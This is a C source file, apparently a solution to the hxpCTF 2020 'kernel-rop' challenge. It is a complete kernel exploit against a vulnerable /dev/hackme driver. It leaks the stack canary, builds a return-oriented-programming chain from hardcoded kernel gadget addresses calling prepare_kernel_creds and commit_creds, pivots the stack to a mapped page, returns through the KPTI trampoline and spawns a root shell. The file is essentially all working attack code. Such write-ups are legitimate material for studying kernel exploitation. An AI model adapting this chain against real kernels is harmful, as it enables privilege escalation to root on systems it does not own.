/* 
    Kernel-rop - hxpCTF 2020
    SMEP: Enable
    SMAP: Disable
    PTI: Enable
    KASLR: Disable
*/
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <string.h>

unsigned long user_cs, user_ss, user_sp, user_rflags;

void hackme_read(int fd, char *buf, int size){
    int ret; 

    ret = read(fd, buf, size);
    if (ret < 0 ){
        printf("[!] Can't read buf from hackme device.\n");
        exit(-1);
    }
    printf("[*] Read from hackme device: %d bytes.\n", ret);
}
void hackme_write(int fd, char *buf, int size){
    int ret;

    ret = write(fd, buf, size);
    if(ret < 0){
        printf("[!] Can't Write to hackme buf.\n");
        exit(-1);
    }
    printf("[*] Write to hackme buf: %d\n", ret);
}

unsigned long u_cs, u_ss, u_sp, u_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov u_cs, cs;"
        "mov u_ss, ss;"
        "mov u_sp, rsp;"
        "pushf;"
        "pop u_rflags;"
        ".att_syntax;"
    );
}

void root_shell(){
    if(getuid() == 0){
        printf("[*] Got ROOT ! spawn shell...\n");
        system("/bin/sh");
    } printf("[!] Priv Esc failed try again...\n");
}

void main(){
    int fd = open("/dev/hackme", O_RDWR);

    if(fd < 0){
        printf("[!] Can't communicate with hackme device.\n");
        exit(-1);
    }
    unsigned long buf[50]; // 8 bytes foreach object

    // leak canary 
    // note:    Linux Kernel Will change the canary only when open new fd to kernel module
    //          so we can use this canary to perform a buffer overflow vuln.
    hackme_read(fd,buf, sizeof(buf));
    unsigned long canary = buf[16];
    printf("[*] Leaked Canary: %lp\n", canary);

    // Gadget
    // 0xffffffff81f99049 : mov esp, 0xb7140000 ; ret
    unsigned long commit_creds = 0xffffffff814c6410;
    unsigned long prepare_kernel_creds = 0xffffffff814c67f0;
    unsigned long pop_rdi = 0xffffffff81006370;
    unsigned long pop_rcx = 0xffffffff815f4bbc; //0xffffffff815f4bbc : pop rcx ; ret
    unsigned long pop_rdx = 0xffffffff81007616;
    unsigned long pop_rax = 0xffffffff81004d11;
    unsigned long call_rcx = 0xffffffff814edca4;
    unsigned long xchg_eax_esp = 0xffffffff8142ab97;

    
    // 0xffffffff81c32963 : cmp edi, 0xa0ffffff ; pop rsi ; ret
    unsigned long pop_rsi = 0xffffffff8150b97e;
    
    // 0xffffffff818c6f1c : cmp rcx, rsi ; mov rdi, rax ; ja 0xffffffff818c6f0d ; pop rbp ; ret
    unsigned long cmp_rcx_rsi_mov_rdi_rax_pop_rbp = 0xffffffff818c6f1c;

    // chmod ffffffff816d0aa0 T __x64_sys_chmod
    // rdx = 0x1ff
    // rsi = 0x00007fffaecf5f7b
    // rdi = 0xffffff9c
    // call 0xffffffff816d09b0
    unsigned long chmod = 0xffffffff816d09b0;

    // msleep(0x10000) ffffffff81530e60 T msleep
    // rdi = 0x10000
    unsigned long msleep = 0xffffffff81530e60;

    //kpti_tamporine 0xffffffff81200f10 ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode
    unsigned long kpti_tamporine =  0xffffffff81200f10+22;

    // === Exploitation Strategy ===
    //  pop rdi
    //  prepare_kernel_creds(rdi) => mov rdi,rax 
    //  commit_creds(rdi)
    //  kpti tamporine exit | junk rax | junk rdi | rip(get_shell) | cs | rflags | sp | ss 

    save_state();

    unsigned long *fake_stack = mmap((void *)0xdead1000-0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned index = 0x1000/8;      // index to 2nd page
    fake_stack[0] = 0x0067616c662f;   // '/flag'
    fake_stack[index++] = pop_rdi;  //ROP gadget
    fake_stack[index++] = 0;
    fake_stack[index++] = prepare_kernel_creds;
    // set rcx and rsi = 0
    fake_stack[index++] = pop_rcx;
    fake_stack[index++] = 0;
    fake_stack[index++] = pop_rsi;
    fake_stack[index++] = 0;
    // cmp rcx, rsi eq this instruction will not jmp
    fake_stack[index++] = cmp_rcx_rsi_mov_rdi_rax_pop_rbp;
    fake_stack[index++] = 0; //rbp
    fake_stack[index++] = commit_creds;
    // priv esc!
    fake_stack[index++] = kpti_tamporine;
    fake_stack[index++] = 0;    //pop rax
    fake_stack[index++] = 0;    //pop rdi
    fake_stack[index++] = (unsigned long)root_shell;
    fake_stack[index++] = u_cs;
    fake_stack[index++] = u_rflags;
    fake_stack[index++] = u_sp;
    fake_stack[index++] = u_ss;

    // Overflow the Saved RIP = 0xdeadbeefdeadbeef
    int offset = 16;
    buf[offset++] = canary;
    buf[offset++] = 0;
    buf[offset++] = 0;
    buf[offset++] = 0;
    buf[offset++] = pop_rax;
    buf[offset++] = 0xdead1000;
    buf[offset++] = xchg_eax_esp;

    hackme_write(fd,buf, sizeof(buf));


    


}